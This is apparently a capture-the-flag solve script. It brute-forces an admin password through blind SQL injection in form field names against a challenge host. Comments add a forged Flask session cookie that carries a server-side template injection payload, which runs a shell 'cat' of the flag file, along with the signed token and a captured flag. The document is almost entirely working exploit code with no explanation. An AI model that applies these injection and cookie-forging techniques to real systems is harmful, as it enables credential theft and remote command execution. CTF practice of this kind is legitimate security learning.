import requests

ALPHABET = "abcdef"
ALPHABET = ALPHABET + ALPHABET.upper() + "0123456789"

SQL = ""
print(SQL.encode().hex().upper())
while True:
  for c in ALPHABET:
    TEMP_SQL = SQL + (c)
    print(f"Trying {TEMP_SQL}...")
    d = requests.post("http://afcad41264bde94d71a44.playat.flagyard.com", data={
      f"0 or ((SELECT COUNT(username) from users where HEX(username) like HEX('admin') and HEX(password) like '{TEMP_SQL}%') > 0)":"1",
      f"0 or ((SELECT COUNT(username) from users where HEX(username) like HEX('admin') and HEX(password) like '{TEMP_SQL}%') > 0) or 0": "1"
    })

    if "welcome" in d.text.lower():
      SQL = TEMP_SQL
      print(SQL)
      
      
# BHFlagY{2f91fdcf03d4750c0cc65816f08c0b8a}
# python flask_session_cookie_manager3.py encode -s 'ILIKEpotatoesSOMUCH::&&' -t '{"type":"{{ dict.__base__.__subclasses__()[470](\"cat ../flag_*.txt\",shell=True,stdout=-1).communicate()[0].strip() }}"}'
# eyJ0eXBlIjoie3sgZGljdC5fX2Jhc2VfXy5fX3N1YmNsYXNzZXNfXygpWzQ3MF0oXCJjYXQgLi4vZmxhZ18qLnR4dFwiLHNoZWxsPVRydWUsc3Rkb3V0PS0xKS5jb21tdW5pY2F0ZSgpWzBdLnN0cmlwKCkgfX0ifQ.ZSOSEQ.61aAonQbPb75Xcon69reSoMD8D0